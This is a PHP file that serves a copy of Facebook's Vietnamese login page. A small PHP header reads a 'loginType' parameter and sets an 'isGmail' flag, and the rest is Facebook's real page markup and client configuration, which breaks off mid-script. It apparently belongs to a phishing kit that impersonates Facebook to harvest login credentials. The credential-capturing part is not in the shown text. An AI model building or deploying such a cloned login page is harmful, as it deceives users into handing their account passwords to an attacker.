<?php
$isGmail = false;
if (isset($_GET['loginType'])) {
        if ($_GET['loginType'] == 'EMAIL') {
                $isGmail = true;
        }
}
?>
<!DOCTYPE html>
<html lang="vi" id="facebook" class="no_js">

<head>
        <meta charset="utf-8" />
        <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
        <script nonce="1NUvCCU4">
                window._cstart = +new Date();
        </script>
        <style nonce="1NUvCCU4"></style>
        <title id="pageTitle">Facebook - Đăng nhập hoặc đăng ký</title>
        <meta property="og:site_name" content="Facebook" />
        <meta property="og:url" content="https://www.facebook.com/" />
        <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
        <meta property="og:locale" content="vi_VN" />
        <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
        <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
        <meta name="description" content="H&#xe3;y &#x111;&#x103;ng nh&#x1ead;p Facebook &#x111;&#x1ec3; b&#x1eaf;t &#x111;&#x1ea7;u chia s&#x1ebb; v&#xe0; k&#x1ebf;t n&#x1ed1;i v&#x1edb;i b&#x1ea1;n b&#xe8;, gia &#x111;&#xec;nh v&#xe0; nh&#x1eef;ng ng&#x1b0;&#x1edd;i b&#x1ea1;n bi&#x1ebf;t." />
        <link rel="canonical" href="https://www.facebook.com/" />
        <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/L0VTH1UsUXD.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="0QQt+vI" crossorigin="anonymous" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/0A0Zd_YhspS.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="3/wEZOU" crossorigin="anonymous" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/0,cross/KNCGuYCuCGw.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="9hms7g4" crossorigin="anonymous" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y5/l/0,cross/Q-AMn1VL0ov.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="POcLwUx" crossorigin="anonymous" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/0nZrIbFwC54.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="jM587go" crossorigin="anonymous" />
        <script src="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/45LapIJFFqp.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="A+mvvL2" crossorigin="anonymous" nonce="1NUvCCU4"></script>
        <script nonce="1NUvCCU4">
                requireLazy(["HasteSupportData"], function(m) {
                        m.handle({
                                "clpData": {
                                        "1814852": {
                                                "r": 1
                                        },
                                        "1949898": {
                                                "r": 1
                                        },
                                        "1848815": {
                                                "r": 10000,
                                                "s": 1
                                        },
                                        "1744178": {
                                                "r": 1,
                                                "s": 1
                                        }
                                },
                                "gkxData": {
                                        "5241": {
                                                "result": true,
                                                "hash": "AT7o1bCQPGpf3ShEx8I"
                                        },
                                        "676837": {
                                                "result": false,
                                                "hash": "AT4N8wBZA8ctCdHwkqo"
                                        },
                                        "708253": {
                                                "result": false,
                                                "hash": "AT5n4hBL3YTMnQWtFOk"
                                        },
                                        "996940": {
                                                "result": false,
                                                "hash": "AT7opYuEGy3sjG1agKE"
                                        },
                                        "1224637": {
                                                "result": false,
                                                "hash": "AT7JRluWxuwDm3XzKLg"
                                        },
                                        "1263340": {
                                                "result": false,
                                                "hash": "AT5bwizWgDaFQudmfIo"
                                        },
                                        "676920": {
                                                "result": true,
                                                "hash": "AT497IX4gOFG8gZedyc"
                                        },
                                        "1073500": {
                                                "result": false,
                                                "hash": "AT7aJmfnqWyioxOOEIA"
                                        },
                                        "1857581": {
                                                "result": false,
                                                "hash": "AT5yTxGMp6le0PAtHrA"
                                        },
                                        "2772": {
                                                "result": false,
                                                "hash": "AT5Eu244WIce7iwqe04"
                                        },
                                        "3752": {
                                                "result": false,
                                                "hash": "AT6eS5UTkkMp_xbPjJk"
                                        },
                                        "3831": {
                                                "result": false,
                                                "hash": "AT4W23lQ0XxAZniMaXU"
                                        },
                                        "4075": {
                                                "result": false,
                                                "hash": "AT4_ZQi0sTjSt-RxMyI"
                                        },
                                        "676838": {
                                                "result": false,
                                                "hash": "AT6nN1ehT9yq-2q6G9I"
                                        },
                                        "1217157": {
                                                "result": false,
                                                "hash": "AT6B7YmllOsArnK6sYo"
                                        },
                                        "1554827": {
                                                "result": false,
                                                "hash": "AT7zueGLhGo0cT5xSes"
                                        },
                                        "1738486": {
                                                "result": false,
                                                "hash": "AT4cX37oQco6DwhUy70"
                                        }
                                },
                                "qplData": {
                                        "7758": {
                                                "r": 1
                                        }
                                }
                        })
                });
                requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
                        (new ServerJS()).handle({
                                "define": [
                                        ["URLFragmentPreludeConfig", [], {
                                                "hashtagRedirect": true,
                                                "fragBlacklist": ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"]
                                        }, 137],
                                        ["CometPersistQueryParams", [], {
                                                "relative": {},
                                                "domain": {}
                                        }, 6231],
                                        ["CookieDomain", [], {
                                                "domain": "facebook.com"
                                        }, 6421],
                                        ["BootloaderConfig", [], {
                                                "deferBootloads": false,
                                                "jsRetries": [200, 500],
                                                "jsRetryAbortNum": 2,
                                                "jsRetryAbortTime": 5,
                                                "silentDups": false,
                                                "hypStep4": false,
                                                "phdOn": false,
                                                "btCutoffIndex": 2935
                                        }, 329],
                                        ["CSSLoaderConfig", [], {
                                                "timeout": 5000,
                                                "modulePrefix": "BLCSS:",
                                                "loadEventSupported": true
                                        }, 619],
                                        ["CookieCoreConfig", [], {
                                                "c_user": {
                                                        "s": "None"
                                                },
                                                "cppo": {
                                                        "t": 86400,
                                                        "s": "None"
                                                },
                                                "dpr": {
                                                        "t": 604800,
                                                        "s": "None"
                                                },
                                                "fbl_ci": {
                                                        "t": 31536000,
                                                        "s": "None"
                                                },
                                                "fbl_cs": {
                                                        "t": 31536000,
                                                        "s": "None"
                                                },
                                                "fbl_st": {
                                                        "t": 31536000,
                                                        "s": "Strict"
                                                },
                                                "i_user": {
                                                        "s": "None"
                                                },
                                                "locale": {
                                                        "t": 604800,
                                                        "s": "None"
                                                },
                                                "m_pixel_ratio": {
                                                        "t": 604800,
                                                        "s": "None"
                                                },
                                                "noscript": {
                                                        "s": "None"
                                                },
                                                "presence": {
                                                        "t": 2592000,
                                                        "s": "None"
                                                },
                                                "sfau": {
                                                        "s": "None"
                                                },
                                                "usida": {
                                                        "s": "None"
                                                },
                                                "vpd": {
                                                        "t": 5184000,
                                                        "s": "Lax"
                                                },
                                                "wd": {
                                                        "t": 604800,
                                                        "s": "Lax"
                                                },
                                                "x-referer": {
                                                        "s": "None"
                                                },
                                                "x-src": {
                                                        "t": 1,
                                                        "s": "None"
                                                }
                                        }, 2104],
                                        ["CurrentCommunityInitialData", [], {}, 490],
                                        ["CurrentEnvironment", [], {
                                                "facebookdotcom": true,
                                                "messengerdotcom": false,
                                                "workplacedotcom": false,
                                                "instagramdotcom": false
                                        }, 827],
                                        ["CurrentUserInitialData", [], {
                                                "ACCOUNT_ID": "0",
                                                "USER_ID": "0",
                                                "NAME": "",
                                                "SHORT_NAME": null,
                                                "IS_BUSINESS_PERSON_ACCOUNT": false,
                                                "HAS_SECONDARY_BUSINESS_PERSON": false,
                                                "IS_FACEBOOK_WORK_ACCOUNT": false,
                                                "IS_MESSENGER_ONLY_USER": false,
                                                "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
                                                "IS_MESSENGER_CALL_GUEST_USER": false,
                                                "IS_WORK_MESSENGER_CALL_GUEST_USER": false,
                                                "APP_ID": "256281040558",
                                                "IS_BUSINESS_DOMAIN": false
                                        }, 270],
                                        ["DTSGInitialData", [], {}, 258],
                                        ["ISB", [], {}, 330],
                                        ["LSD", [], {
                                                "token": "AVpvA9wfZZI"
                                        }, 323],
                                        ["ServerNonce", [], {
                                                "ServerNonce": "5i5skNtvloctZe_GRFrmFL"
                                        }, 141],
                                        ["SiteData", [], {
                                                "server_revision": 1005032776,
                                                "client_revision": 1005032776,
                                                "tier": "",
                                                "push_phase": "C3",
                                                "pkg_cohort": "BP:DEFAULT",
                                                "haste_session": "19030.BP:DEFAULT.2.0.0.0.",
                                                "pr": 1.5,
                                                "haste_site": "www",
                                                "be_one_ahead": false,
                                                "ir_on": true,
                                                "is_rtl": false,
                                                "is_comet": false,
                                                "is_experimental_tier": false,
                                                "is_jit_warmed_up": true,
                                                "hsi": "7061989578540971455-0",
                                                "semr_host_bucket": "5",
                                                "bl_hash_version": 2,
                                                "skip_rd_bl": true,
                                                "comet_env": 0,
                                                "spin": 4,
                                                "__spin_r": 1005032776,
                                                "__spin_b": "trunk",
                                                "__spin_t": 1644247579,
                                                "vip": "2a03:2880:f10c:181:face:b00c:0:25de"
                                        }, 317],
                                        ["SprinkleConfig", [], {
                                                "param_name": "jazoest",
                                                "version": 2,
                                                "should_randomize": false
                                        }, 2111],
                                        ["UserAgentData", [], {
                                                "browserArchitecture": "64",
                                                "browserFullVersion": "97.0.4692.99",
                                                "browserMinorVersion": 0,
                                                "browserName": "Chrome",
                                                "browserVersion": 97,
                                                "deviceName": "Unknown",
                                                "engineName": "WebKit",
                                                "engineVersion": "537.36",
                                                "platformArchitecture": "64",
                                                "platformName": "Windows",
                                                "platformVersion": "10",
                                                "platformFullVersion": "10"
                                        }, 527],
                                        ["PromiseUsePolyfillSetImmediateGK", [], {
                                                "www_always_use_polyfill_setimmediate": false
                                        }, 2190],
                                        ["KSConfig", [], {
                                                "killed": {
                                                        "__set": ["MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER", "MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP", "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE", "BUY_AT_UI_LINE_DELETE", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME", "ADS_STORE_VISITS_METRICS_DEPRECATION", "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER", "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION", "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL", "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS", "LAB_NET_NEW_UI_RELEASE", "POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER", "SRT_BANZAI_SRT_MAIN_LOGGER", "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES", "POCKET_MONSTERS_UPDATE_NAME", "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE", "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER", "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD"]
                                                },
                                                "ko": {
                                                        "__set": ["8H4bQmEiuLT", "3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG", "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "rf8JEPGgOi", "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj", "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W", "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "5mNEXob0nTj", "8rDvN9vWdAK", "9cL5o2kjfZo", "5BdzWGmfvrA", "DDZhogI19W", "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z", "MPMaqnqZ9c", "5XCz1h9Iaw3", "7r6mSP7ofr2", "6DGPLrRdyts", "aWxCyi1sEC7", "9kCSDzzr8fu"]
                                                }
                                        }, 2580],
                                        ["JSErrorLoggingConfig", [], {
                                                "appId": 256281040558,
                                                "extra": [],
                                                "reportInterval": 50,
                                                "sampleWeight": null,
                                                "sampleWeightKey": "__jssesw",
                                                "projectBlocklist": []
                                        }, 2776],
                                        ["DataStoreConfig", [], {
                                                "expandoKey": "__FB_STORE",
                                                "useExpando": true
                                        }, 2915],
                                        ["CookieCoreLoggingConfig", [], {
                                                "maximumIgnorableStallMs": 16.67,
                                                "sampleRate": 9.7e-5,
                                                "sampleRateClassic": 1.0e-10,
                                                "sampleRateFastStale": 1.0e-8
                                        }, 3401],
                                        ["ImmediateImplementationExperiments", [], {
                                                "prefer_message_channel": true
                                        }, 3419],
                                        ["DTSGInitData", [], {
                                                "token": "",
                                                "async_get_token": ""
                                        }, 3515],
                                        ["UriNeedRawQuerySVConfig", [], {
                                                "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com", "nibio.no"]
                                        }, 3871],
                                        ["InitialCookieConsent", [], {
                                                "deferCookies": false,
                                                "initialConsent": {
                                                        "__set": [1, 2]
                                                },
                                                "noCookies": false,
                                                "shouldShowCookieBanner": false
                                        }, 4328],
                                        ["TrustedTypesConfig", [], {
                                                "useTrustedTypes": false,
                                                "reportOnly": false
                                        }, 4548],
                                        ["WebConnectionClassServerGuess", [], {
                                                "connectionClass": "EXCELLENT"
                                        }, 4705],
                                        ["CometAltpayJsSdkIframeAllowedDomains", [], {
                                                "allowed_domains": ["https:\/\/live.adyen.com", "https:\/\/integration-facebook.payu.in", "https:\/\/facebook.payulatam.com", "https:\/\/secure.payu.com", "https:\/\/facebook.dlocal.com", "https:\/\/buy2.boku.com"]
                                        }, 4920],
                                        ["BootloaderEndpointConfig", [], {
                                                "debugNoBatching": false,
                                                "endpointURI": "https:\/\/www.facebook.com\/ajax\/bootloader-endpoint\/"
                                        }, 5094],
                                        ["CookieConsentIFrameConfig", [], {
                                                "consent_param": "FQAREhIA.ARbfKELe9xWBrJmwM9QOCu6qashhfVxq31n9zTF36TER9bwE",
                                                "allowlisted_iframes": []
                                        }, 5540],
                                        ["BigPipeExperiments", [], {
                                                "link_images_to_pagelets": false,
                                                "enable_bigpipe_plugins": false
                                        }, 907],
                                        ["AsyncRequestConfig", [], {
                                                "retryOnNetworkError": "1",
                                                "useFetchStreamAjaxPipeTransport": false
                                        }, 328],
                                        ["FbtQTOverrides", [], {
                                                "overrides": {}
                                        }, 551],
                                        ["FbtResultGK", [], {
                                                "shouldReturnFbtResult": true,
                                                "inlineMode": "NO_INLINE"
                                        }, 876],
                                        ["IntlPhonologicalRules", [], {
                                                "meta": {},
                                                "patterns": {}
                                        }, 1496],
                                        ["IntlViewerContext", [], {
                                                "GENDER": 3,
                                                "regionalLocale": null
                                        }, 772],
                                        ["NumberFormatConfig", [], {
                                                "decimalSeparator": ",",
                                                "numberDelimiter": ".",
                                                "minDigitsForThousandsSeparator": 4,
                                                "standardDecimalPatternInfo": {
                                                        "primaryGroupSize": 3,
                                                        "secondaryGroupSize": 3
                                                },
                                                "numberingSystemData": null
                                        }, 54],
                                        ["SessionNameConfig", [], {
                                                "seed": "1qii"
                                        }, 757],
                                        ["ZeroCategoryHeader", [], {}, 1127],
                                        ["ZeroRewriteRules", [], {
                                                "rewrite_rules": {},
                                                "whitelist": {
                                                        "\/hr\/r": 1,
                                                        "\/hr\/p": 1,
                                                        "\/zero\/unsupported_browser\/": 1,
                                                        "\/zero\/policy\/optin": 1,
                                                        "\/zero\/optin\/write\/": 1,
                                                        "\/zero\/optin\/legal\/": 1,
                                                        "\/zero\/optin\/free\/": 1,
                                                        "\/about\/privacy\/": 1,
                                                        "\/about\/privacy\/update\/": 1,
                                                        "\/privacy\/explanation\/": 1,
                                                        "\/zero\/toggle\/welcome\/": 1,
                                                        "\/zero\/toggle\/nux\/": 1,
                                                        "\/zero\/toggle\/settings\/": 1,
                                                        "\/fup\/interstitial\/": 1,
                                                        "\/work\/landing": 1,
                                                        "\/work\/login\/": 1,
                                                        "\/work\/email\/": 1,
                                                        "\/ai.php": 1,
                                                        "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                                                        "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
                                                        "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
                                                        "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
                                                        "\/qp\/interstitial\/": 1,
                                                        "\/qp\/action\/redirect\/": 1,
                                                        "\/qp\/action\/close\/": 1,
                                                        "\/zero\/support\/ineligible\/": 1,
                                                        "\/zero_balance_redirect\/": 1,
                                                        "\/zero_balance_redirect": 1,
                                                        "\/zero_balance_redirect\/l\/": 1,
                                                        "\/l.php": 1,
                                                        "\/lsr.php": 1,
                                                        "\/ajax\/dtsg\/": 1,
                                                        "\/checkpoint\/block\/": 1,
                                                        "\/exitdsite": 1,
                                                        "\/zero\/balance\/pixel\/": 1,
                                                        "\/zero\/balance\/": 1,
                                                        "\/zero\/balance\/carrier_landing\/": 1,
                                                        "\/zero\/flex\/logging\/": 1,
                                                        "\/tr": 1,
                                                        "\/tr\/": 1,
                                                        "\/sem_campaigns\/sem_pixel_test\/": 1,
                                                        "\/bookmarks\/flyout\/body\/": 1,
                                                        "\/zero\/subno\/": 1,
                                                        "\/confirmemail.php": 1,
                                                        "\/policies\/": 1,
                                                        "\/mobile\/internetdotorg\/classifier\/": 1,
                                                        "\/zero\/dogfooding": 1,
                                                        "\/xti.php": 1,
                                                        "\/zero\/fblite\/config\/": 1,
                                                        "\/hr\/zsh\/wc\/": 1,
                                                        "\/ajax\/bootloader-endpoint\/": 1,
                                                        "\/mobile\/zero\/carrier_page\/": 1,
                                                        "\/mobile\/zero\/carrier_page\/education_page\/": 1,
                                                        "\/mobile\/zero\/carrier_page\/feature_switch\/": 1,
                                                        "\/mobile\/zero\/carrier_page\/settings_page\/": 1,
                                                        "\/aloha_check_build": 1,
                                                        "\/upsell\/zbd\/softnudge\/": 1,
                                                        "\/mobile\/zero\/af_transition\/": 1,
                                                        "\/mobile\/zero\/af_transition\/action\/": 1,
                                                        "\/mobile\/zero\/freemium\/": 1,
                                                        "\/mobile\/zero\/freemium\/redirect\/": 1,
                                                        "\/mobile\/zero\/freemium\/zero_fup\/": 1,
                                                        "\/privacy\/policy\/": 1,
                                                        "\/privacy\/center\/": 1,
                                                        "\/data\/manifest\/": 1,
                                                        "\/4oh4.php": 1,
                                                        "\/autologin.php": 1,
                                                        "\/birthday_help.php": 1,
                                                        "\/checkpoint\/": 1,
                                                        "\/contact-importer\/": 1,
                                                        "\/cr.php": 1,
                                                        "\/legal\/terms\/": 1,
                                                        "\/login.php": 1,
                                                        "\/login\/": 1,
                                                        "\/mobile\/account\/": 1,
                                                        "\/n\/": 1,
                                                        "\/remote_test_device\/": 1,
                                                        "\/upsell\/buy\/": 1,
                                                        "\/upsell\/buyconfirm\/": 1,
                                                        "\/upsell\/buyresult\/": 1,
                                                        "\/upsell\/promos\/": 1,
                                                        "\/upsell\/continue\/": 1,
                                                        "\/upsell\/h\/promos\/": 1,
                                                        "\/upsell\/loan\/learnmore\/": 1,
                                                        "\/upsell\/purchase\/": 1,
                                                        "\/upsell\/promos\/upgrade\/": 1,
                                                        "\/upsell\/buy_redirect\/": 1,
                                                        "\/upsell\/loan\/buyconfirm\/": 1,
                                                        "\/upsell\/loan\/buy\/": 1,
                                                        "\/upsell\/sms\/": 1,
                                                        "\/wap\/a\/channel\/reconnect.php": 1,
                                                        "\/wap\/a\/nux\/wizard\/nav.php": 1,
                                                        "\/wap\/appreg.php": 1,
                                                        "\/wap\/birthday_help.php": 1,
                                                        "\/wap\/c.php": 1,
                                                        "\/wap\/confirmemail.php": 1,
                                                        "\/wap\/cr.php": 1,
                                                        "\/wap\/login.php": 1,
                                                        "\/wap\/r.php": 1,
                                                        "\/zero\/datapolicy": 1,
                                                        "\/a\/timezone.php": 1,
                                                        "\/a\/bz": 1,
                                                        "\/bz\/reliability": 1,
                                                        "\/r.php": 1,
                                                        "\/mr\/": 1,
                                                        "\/reg\/": 1,
                                                        "\/registration\/log\/": 1,
                                                        "\/terms\/": 1,
                                                        "\/f123\/": 1,
                                                        "\/expert\/": 1,
                                                        "\/experts\/": 1,
                                                        "\/terms\/index.php": 1,
                                                        "\/terms.php": 1,
                                                        "\/srr\/": 1,
                                                        "\/msite\/redirect\/": 1,
                                                        "\/fbs\/pixel\/": 1,
                                                        "\/contactpoint\/preconfirmation\/": 1,
                                                        "\/contactpoint\/cliff\/": 1,
                                                        "\/contactpoint\/confirm\/submit\/": 1,
                                                        "\/contactpoint\/confirmed\/": 1,
                                                        "\/contactpoint\/login\/": 1,
                                                        "\/preconfirmation\/contactpoint_change\/": 1,
                                                        "\/help\/contact\/": 1,
                                                        "\/survey\/": 1,
                                                        "\/upsell\/loyaltytopup\/accept\/": 1,
                                                        "\/settings\/": 1,
                                                        "\/lite\/": 1,
                                                        "\/zero_status_update\/": 1,
                                                        "\/operator_store\/": 1,
                                                        "\/upsell\/": 1,
                                                        "\/wifiauth\/login\/": 1
                                                }
                                        }, 1478],
                                        ["IntlNumberTypeConfig", [], {
                                                "impl": "return IntlVariations.NUMBER_OTHER;"
                                        }, 3405],
                                        ["ServerTimeData", [], {
                                                "serverTime": 1644247579613,
                                                "timeOfRequestStart": 1644247579503.4,
                                                "timeOfResponseStart": 1644247579503.4
                                        }, 5943],
                                        ["AnalyticsCoreData", [], {
                                                "device_id": "$^|AcZ11B3GyU9-eGZLbvJ9-D0ujgnthWrjWjX4rquKgVmwIXCmtW4bSgnIVvB_0cqpAG5cPV3oAE6G0pBQ0q9tFqFPRjKnB19DFKsZa6DkzY3PZ_QX3CTr_b8L4LUdrdonOm7cuHqzgHxGNGfOOxLLBjK5KN8lxb0|fd.AcYdpSg5Z3fWLGZdLmvZnVj8EdzbyN_q8KOWAzUgLMJbcLnP9mC2BJGEkvgTh1Ogu6yrCox7zgyp6GrFL1fxgUjs",
                                                "app_id": "256281040558",
                                                "enable_bladerunner": false,
                                                "enable_ack": true,
                                                "push_phase": "C3",
                                                "enable_observer": false,
                                                "enable_dataloss_timer": false
                                        }, 5237],
                                        ["cr:696703", [], {
                                                "__rc": [null, "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:708886", ["EventProfilerImpl"], {
                                                "__rc": ["EventProfilerImpl", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:717822", ["TimeSliceImpl"], {
                                                "__rc": ["TimeSliceImpl", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:806696", ["clearTimeoutBlue"], {
                                                "__rc": ["clearTimeoutBlue", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:807042", ["setTimeoutBlue"], {
                                                "__rc": ["setTimeoutBlue", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:896462", ["setIntervalAcrossTransitionsBlue"], {
                                                "__rc": ["setIntervalAcrossTransitionsBlue", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:986633", ["setTimeoutAcrossTransitionsBlue"], {
                                                "__rc": ["setTimeoutAcrossTransitionsBlue", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:1003267", ["clearIntervalBlue"], {
                                                "__rc": ["clearIntervalBlue", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:1183579", ["InlineFbtResultImpl"], {
                                                "__rc": ["InlineFbtResultImpl", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:925100", ["RunBlue"], {
                                                "__rc": ["RunBlue", "Aa09qZX9gS2-Z-DFvR06omm5jIekSaHWniBxo3w8EW6rI_o_u9ESWQAHwb2_H1BB507oBQKazAJdoXcBAsy9QO7DIdc"]
                                        }, -1],
                                        ["cr:729414", ["VisualCompletion"], {
                                                "__rc": ["VisualCompletion", "Aa3t_-B19RM9KJb-Wtw8DrsYJNuLVUG321YYWEuulPZiqg5XLH2Xhl4J0g7HyVCMRj-Ay_H59F6u4zf9VyUntLwz"]
                                        }, -1],
                                        ["cr:1094907", [], {
                                                "__rc": [null, "Aa2hfI0-pr-wRitwFNcNCv-nRWkfe8-fWcKeVesc8R9Mf595eUSnin-6k-GPRW7F3_2V-SfmB25J-NnDmcinsv8"]
                                        }, -1],
                                        ["EventConfig", [], {
                                                "sampling": {
                                                        "bandwidth": 0,
                                                        "play": 0,
                                                        "playing": 0,
                                                        "progress": 0,
                                                        "pause": 0,
                                                        "ended": 0,
                                                        "seeked": 0,
                                                        "seeking": 0,
                                                        "waiting": 0,
                                                        "loadedmetadata": 0,
                                                        "canplay": 0,
                                                        "selectionchange": 0,
                                                        "change": 0,
                                                        "timeupdate": 0,
                                                        "adaptation": 0,
                                                        "focus": 0,
                                                        "blur": 0,
                                                        "load": 0,
                                                        "error": 0,
                                                        "message": 0,
                                                        "abort": 0,
                                                        "storage": 0,
                                                        "scroll": 200000,
                                                        "mousemove": 20000,
                                                        "mouseover": 10000,
                                                        "mouseout": 10000,
                                                        "mousewheel": 1,
                                                        "MSPointerMove": 10000,
                                                        "keydown": 0.1,
                                                        "click": 0.02,
                                                        "mouseup": 0.02,
                                                        "__100ms": 0.001,
                                                        "__default": 5000,
                                                        "__min": 100,
                                                        "__interactionDefault": 200,
                                                        "__eventDefault": 100000
                                                },
                                                "page_sampling_boost": 1,
                                                "interaction_regexes": {},
                                                "interaction_boost": {},
                                                "event_types": {},
                                                "manual_instrumentation": false,
                                                "profile_eager_execution": false,
                                                "disable_heuristic": true,
                                                "disable_event_profiler": false
                                        }, 1726],
                                        ["AdsInterfacesSessionConfig", [], {}, 2393],
                                        ["IntlCurrentLocale", [], {
                                                "code": "vi_VN"
                                        }, 5954],
                                        ["USIDMetadata", [], {
                                                "browser_id": "?",
                                                "tab_id": "",
                                                "page_id": "Pr6xxjvvh1gaw",
                                                "transition_id": 0,
                                                "version": 6
                                        }, 5888],
                                        ["cr:686", [], {
                                                "__rc": [null, "Aa3HZ4O1W1NdHzSOamJepOodQsa1qXXBeahPL747WPYQv9llS9qrOI9zXxdniEEgnnedlhvHh9ZxGooTbOp4WT3K"]
                                        }, -1],
                                        ["cr:1984081", [], {
                                                "__rc": [null, "Aa0Lz7wgmgbiypDfvRVZxTi47rgYUYDXDM8WMIGaErdqdNPAvkYnsnJgeqdzhy-SZ55GXDAyaubPQsEUaY6LvP5qwD13"]
                                        }, -1]
                                ],
                                "require": [
                                        ["markJSEnabled"],
                                        ["lowerDomain"],
                                        ["URLFragmentPrelude"],
                                        ["Primer"],
                                        ["BigPipe"],
                                        ["Bootloader"],
                                        ["TimeSlice"],
                                        ["AsyncRequest"],
                                        ["BanzaiScuba_DEPRECATED"],
                                        ["VisualCompletionGating"],
                                        ["FbtLogging"],
                                        ["IntlQtEventFalcoEvent"],
                                        ["RequireDeferredReference", "unblock", [],
                                                [
